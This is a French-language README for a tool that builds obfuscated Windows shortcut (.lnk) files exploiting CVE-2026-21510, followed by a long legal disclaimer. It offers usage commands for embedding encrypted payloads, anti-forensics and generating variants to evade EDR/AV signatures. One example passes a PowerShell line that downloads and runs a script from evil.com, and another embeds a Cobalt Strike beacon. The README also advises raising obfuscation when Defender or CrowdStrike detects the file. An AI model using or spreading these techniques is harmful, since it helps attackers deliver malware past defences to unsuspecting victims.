README  EpSiLoNPoInTlnk
CVE-2026-21510 - Générateur de .LNK
Outil pour la génération de fichiers .lnk utilisant la vulnérabilité CVE-2026-21510 (Windows ShellLink Remote Code Execution).
Conçu pour la recherche en sécurité offensive, les tests de pénétration autorisés, et l'analyse de vulnérabilités.

Avertissement Légal
⚠️ CET OUTIL EST DESTINÉ UNIQUEMENT À UN USAGE LÉGAL ET AUTORISÉ.
Toute utilisation non autorisée contre des systèmes ou réseaux violerait les lois locales et internationales (ex: Computer Fraud and Abuse Act (CFAA), RGPD, Loi Godfrain en France).
L'auteur décline toute responsabilité en cas de mauvaise utilisation. (Voir la Clause de Non-Responsabilité ci-dessous.)

Description
Ce générateur crée des fichiers .lnk obfusqués pour utiliser CVE-2026-21510, une vulnérabilité dans le traitement des raccourcis Windows.
Il intègre :

LNK Stomping (5 variantes : dot, path_segment, relative, double_extension, unicode)

PropertyStore avec CLSID aléatoires et PKEY

KnownFolderDataBlock (KnownFolderID aléatoires ou ciblés)

EnvironmentVariableDataBlock (obfuscation Unicode, variables dynamiques)

Obfuscation (Niveaux 1-5 : TrackerDataBlock, ConsoleDataBlock, blocs aléatoires)

Payloads embarqués et chiffrés (AES-256-CBC + XOR)

Anti-Forensics (timestamps à 0, taille de fichier à 0, métadonnées minimales)

Contournement EDR/AV (processus légitimes, arguments obfusqués en PowerShell)

Génération de variantes aléatoires (10+ variantes uniques pour éviter les signatures)

Prérequis
Système
OS : Windows (pour tester les .lnk générés) ou Linux/macOS (pour la génération).

Python : ≥ 3.10.
Dépendances :
pip install pycryptodome

Outils Recommandés
Analyse : PEStudio, Detect It Easy (DIE)

Debug : x64dbg, WinDbg

Tests : Machine virtuelle Windows (ex: Windows 10/11 sur VirtualBox) isolée.

Installation
Cloner le dépôt :
git clone https://github.com/EpSiLoNPoInT/EpSiLoNPoInTlnk.git
cd EpSiLoNPoInTlnk
Installer les dépendances :
pip install -r requirements.txt
(Optionnel) Créer un environnement virtuel :
python -m venv venv
source venv/bin/activate # Linux/macOS
venv\Scripts\activate # Windows

Utilisation
1. Génération Basique
python lnkstomperpoint.py --target "C:\\Windows\\System32\\cmd.exe" --args "/c calc.exe" --output exploit.lnk
Génère un .lnk utilisant CVE-2026-21510 pour lancer calc.exe.

2. Options Avancées
Option	Description	Valeur par défaut
--target	Chemin cible (ex: C:\Windows\System32\cmd.exe)	C:\Windows\System32\cmd.exe
--args	Arguments pour la cible (ex: /c whoami)	/c calc.exe
--output	Chemin de sortie du .lnk	./EpSiLoNPoInTlnk_[TIMESTAMP].lnk
--working-dir	Répertoire de travail	C:\Windows\System32
--description	Description du raccourci	Chaîne aléatoire
--unc	Utiliser un chemin UNC (\?\C:\...)	False
--lnk-stomping	Activer le LNK Stomping	True
--stomping-variant	Variante de LNK Stomping (dot, path_segment, relative, double_extension, unicode, random)	random
--obfuscation	Ajouter des blocs ExtraData inutiles	True
--obfuscation-level	Niveau d'obfuscation (1-5)	5
--embed-payload	Chemin vers un fichier à embarquer (ex: payload.bin)	None
--encrypt-payload	Chiffrer le payload (AES-256-CBC + XOR)	True
--anti-forensics	Appliquer des techniques anti-forensics	True
--randomize-clsid	Randomiser le CLSID dans PropertyStore	True
--randomize-known-folder	Randomiser le KnownFolderID	True
--obfuscate-arguments	Obfusquer les arguments (PowerShell)	True
--generate-variants	Générer N variantes aléatoires	0
--debug	Mode debug avancé (logs détaillés)	False
3. Exemples
Exemple 1 : Exploit avec Payload Embarqué
python lnkstomperpoint.py \
--target "C:\\Windows\\System32\\cmd.exe" \
--args "/c payload.exe" \
--embed-payload ./malware.bin \
--output exploit_with_payload.lnk \
--obfuscation-level 5 \
--anti-forensics
Génère un .lnk avec un payload chiffré (AES-256 + XOR) et obfusqué.

Exemple 2 : Génération de 10 Variantes Aléatoires
python lnkstomperpoint.py \
--target "C:\\Windows\\System32\\powershell.exe" \
--args "-nop -ep bypass -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shellcode.ps1')" \
--generate-variants 10 \
--output-dir ./variants
Crée 10 variantes uniques pour éviter les signatures EDR/AV.

Exemple 3 : Mode Minimaliste (pour tests)
python lnkstomperpoint.py \
--target "C:\\Windows\\System32\\notepad.exe" \
--obfuscation False \
--anti-forensics False \
--output minimal_exploit.lnk
Génère un .lnk non obfusqué (pour analyse ou debug).

Fonctionnement Technique
1. Structure du .LNK
Le fichier .lnk généré suit la spécification MS-SHLLINK avec les extensions suivantes :

En-tête ShellLink (0x4C octets fixes + offsets) :
LinkCLSID : 00021401-0000-0000-C000-000000000046 (obligatoire).
LinkFlags : Configure pour activer HasRelativePath, HasWorkingDir, IsUnicode, etc.

StringData :
RelativePath : Chemin cible (avec LNK Stomping si activé).
WorkingDir : Répertoire de travail (ex: C:\Windows\System32).
Arguments : Arguments obfusqués (PowerShell, cmd, etc.).

ExtraData Blocks (ordre critique) :
PropertyStoreDataBlock : Contient PKEY_AppUserModel_ID (CLSID aléatoire).
KnownFolderDataBlock : Pointe vers un dossier système (ex: %SystemRoot%).
EnvironmentVariableDataBlock : Force l'expansion des variables avant le Mark-of-the-Web (MotW).
Blocs d'Obfuscation (selon obfuscation_level) :
TrackerDataBlock (Niveau 1)
ConsoleDataBlock (Niveau 2)
DarwinDataBlock, ShimDataBlock, etc. (Niveaux 3-5)

Payload Embarqué (si --embed-payload) : Chiffré avec AES-256-CBC + XOR.

2. Techniques de Contournement
Technique	Description	Impact
LNK Stomping	Ajoute des caractères invisibles (., \, \u202e) au chemin cible.	Contourne les détections basées sur les signatures de chemins.
PropertyStore	Utilise des PKEY avec CLSID aléatoires pour éviter les signatures.	Évite les règles YARA/EDR ciblant des CLSID connus.
KnownFolder	Pointe vers des dossiers système (%SystemRoot%, %Temp%).	Contourne les restrictions de chemins absolus.
EnvironmentVariable	Obfusque le chemin avec des variables (%TEMP%, %APPDATA%).	Évite les détections statiques.
Obfuscation Niveau 5	Ajoute des blocs ExtraData aléatoires et du padding.	Rend l'analyse statique difficile.
Anti-Forensics	Met à 0 les timestamps, la taille du fichier, etc.	Complique l'analyse forensique.
Arguments Obfusqués	Utilise des techniques PowerShell (Base64, XOR, Reverse).	Contourne les détections de commandes malveillantes. 
3. Chiffrement du Payload
Si --embed-payload est activé :

Le payload est chiffré avec AES-256-CBC (clé aléatoire de 32 octets, IV de 16 octets).

Une couche XOR est appliquée avec les 16 premiers octets de la clé AES.

La clé et l'IV sont stockés dans un ShimDataBlock pour déchiffrement ultérieur.

Tests et Validation
1. Validation Automatique
Le générateur inclut une fonction _validate() qui vérifie :

La taille minimale du fichier.

La validité du HeaderSize et du CLSID.

La présence des LinkFlags requis.

La structure des blocs ExtraData (PropertyStore, KnownFolder, etc.).

2. Tests Manuels
Analyse Statique : Utiliser PEStudio pour vérifier la structure du .lnk. Vérifier que les blocs ExtraData sont bien présents.

Exécution (dans un environnement isolé) : Double-cliquer sur le .lnk et observer le comportement. Utiliser Process Monitor (ProcMon) pour analyser les appels système.

Détection EDR/AV : Tester avec des outils comme Windows Defender ou CrowdStrike. Si le .lnk est détecté, augmenter le obfuscation_level ou désactiver certaines options.

Cas d'Usage
Scénario	Commande	Description
Test de Pénétration	--target "C:\Windows\System32\cmd.exe" --args "/c whoami"	Vérifie si l'exploit fonctionne sur une machine cible.
Red Team	--embed-payload ./cobaltstrike_beacon.bin --obfuscation-level 5	Génère un .lnk avec un payload Cobalt Strike obfusqué.
Recherche	--generate-variants 50 --output-dir ./samples	Crée 50 variantes pour tester les détections EDR.
Debug	--debug --obfuscation False	Affiche des logs détaillés pour analyser la structure du .lnk. 
Contributions
Les contributions sont les bienvenues ! Voici comment contribuer :

Fork le projet.

Créez une branche (git checkout -b feature/ma-nouvelle-fonctionnalité).

Commit vos changements (git commit -m "Ajout de la fonctionnalité X").

Push vers la branche (git push origin feature/ma-nouvelle-fonctionnalité).

Ouvrez une Pull Request.
Idées de Contributions :

Ajouter de nouvelles variantes de LNK Stomping.

Implémenter d'autres algorithmes de chiffrement (ex: ChaCha20).

Améliorer l'obfuscation des arguments (ex: utilisation de JScript).

Ajouter des tests unitaires pour valider les structures .lnk.

Licence
Ce projet est sous licence MIT.
Voir le fichier LICENSE pour plus de détails.

Clause de Non-Responsabilité
🚨 Clause de Non-Responsabilité

📜 CLAUSE DE NON-RESPONSABILITÉ (DISCLAIMER)

Lisez attentivement avant toute utilisation de cet outil.



⚠️ AVERTISSEMENT JURIDIQUE EXPLICITE

L'utilisateur de cet outil (ci-après dénommé "l'Utilisateur") reconnaît et accepte expressément les termes suivants :





Usage Légal Uniquement





Cet outil est exclusivement destiné à un usage légal et autorisé, tel que :





La recherche en sécurité informatique dans un cadre académique ou professionnel.



Les tests de pénétration (pentest) sur des systèmes dont l'Utilisateur a l'autorisation écrite du propriétaire.



L'analyse de vulnérabilités dans des environnements contrôlés (ex: laboratoires de sécurité, CTF, bug bounty autorisés).



Toute autre utilisation est strictement interdite et peut constituer une infraction pénale dans de nombreuses juridictions, y compris (mais sans s'y limiter) :





France : Loi n°88-19 du 5 janvier 1988 (Loi Godfrain), articles 323-1 à 323-7 du Code pénal (accès frauduleux, modification de données, etc.).



Union Européenne : Directive 2013/40/UE sur les attaques contre les systèmes d'information.



États-Unis : Computer Fraud and Abuse Act (CFAA), 18 U.S. Code § 1030.



Autres pays : Lois locales équivalentes (ex: Computer Misuse Act au Royaume-Uni).



Absence de Garantie





L'Auteur (EpSiLoNPoInT) ne fournit aucune garantie, explicite ou implicite, concernant :





La fiabilité, l'exactitude ou l'utilité de cet outil.



L'absence de bugs ou de vulnérabilités dans le code.



La compatibilité avec tous les systèmes ou environnements.



Les résultats obtenus lors de l'utilisation de l'outil.



L'Utilisateur assume tous les risques liés à l'utilisation de cet outil, y compris (mais sans s'y limiter) :





Les dommages matériels ou logiciels causés à son propre système ou à des systèmes tiers.



Les conséquences légales en cas de violation des lois applicables.



Les pertes de données ou les interruptions de service.



Limitation de Responsabilité





En aucun cas, l'Auteur, les contributeurs, ou toute autre partie impliquée dans la création, la production ou la distribution de cet outil ne pourra être tenu responsable de :





Quels que soient les dommages (directs, indirects, accessoires, spéciaux, exemplaires ou consécutifs), y compris (mais sans s'y limiter) :





Les pertes de profits.



Les pertes de données ou la corruption de fichiers.



Les dommages à la réputation.



Les poursuites judiciaires ou amendes encourues par l'Utilisateur.



Même si l'Auteur a été informé de la possibilité de tels dommages.



Respect des Lois et Règlements





L'Utilisateur s'engage à se conformer à toutes les lois, règlements et normes applicables dans sa juridiction, y compris (mais sans s'y limiter) :





Les lois sur la protection des données (ex: RGPD en UE).



Les lois sur la cybersécurité et la fraude informatique.



Les politiques de sécurité de son employeur ou de son organisation.



L'Utilisateur indemnisera et tiendra quitte l'Auteur de toute réclamation, dommage ou dépense (y compris les frais de justice) découlant d'une violation de ces lois ou engagements.



Interdiction de Redistribution Malveillante





L'Utilisateur s'interdit formellement de :





Vendre, louer ou redistribuer cet outil à des fins malveillantes.



Modifier le code pour en faire une arme cybercriminelle (ex: ransomware, spyware).



Utiliser cet outil pour cibler des infrastructures critiques (ex: hôpitaux, gouvernements, banques) sans autorisation explicite.



Partager cet outil avec des tiers sans leur communiquer cette clause de non-responsabilité.



Exclusion de Responsabilité pour les Tierces Parties





Cet outil peut interagir avec des bibliothèques tierces (ex: pycryptodome).



L'Auteur ne contrôle pas et n'est pas responsable des actions ou des vulnérabilités de ces bibliothèques.



L'Utilisateur doit vérifier la licence et la sécurité de toute dépendance utilisée.



Utilisation à Vos Risques et Périls





En utilisant cet outil, vous acceptez pleinement et sans réserve les termes de cette clause.



Si vous n'êtes pas d'accord avec ces termes, ne utilisez pas cet outil et supprimez immédiatement toutes les copies en votre possession.



Juridiction et Loi Applicable





Cette clause est régie par et interprétée conformément aux lois de la République Française.



Tout litige découlant de ou lié à cette clause ou à l'utilisation de cet outil sera soumis à la compétence exclusive des tribunaux de Paris (France).





🔐 Recommandations de Sécurité

Pour une utilisation sûre et légale de cet outil :
✅ Isolez toujours les tests dans un environnement virtuel (ex: VirtualBox, VMware).
✅ Obtenez une autorisation écrite avant de tester sur des systèmes ne vous appartenant pas.
✅ Désactivez les connexions réseau des machines de test pour éviter les fuites accidentelles.
✅ Utilisez des outils de monitoring (ex: Wireshark, Process Monitor) pour analyser le comportement.
✅ Signalez les vulnérabilités de manière responsable (ex: via des programmes de bug bounty).
❌ Ne testez jamais sur des systèmes de production sans autorisation.
❌ Ne partagez pas les exploits générés avec des personnes non autorisées.
❌ Ne stockez pas les payloads malveillants sur des systèmes accessibles au public.





📞 Contact

Pour toute question légale ou technique concernant cet outil :





Auteur : EpSiLoNPoInT



Email : epsilonpoint555@outlook.fr



GitHub : EpSiLoNPoInTOrI



⚠️ Note : L'Auteur ne fournira aucun support pour des utilisations illégales ou non éthiques de cet outil.





📅 Date de la Clause

Dernière mise à jour : 9 mai 2026
Version : 1.0
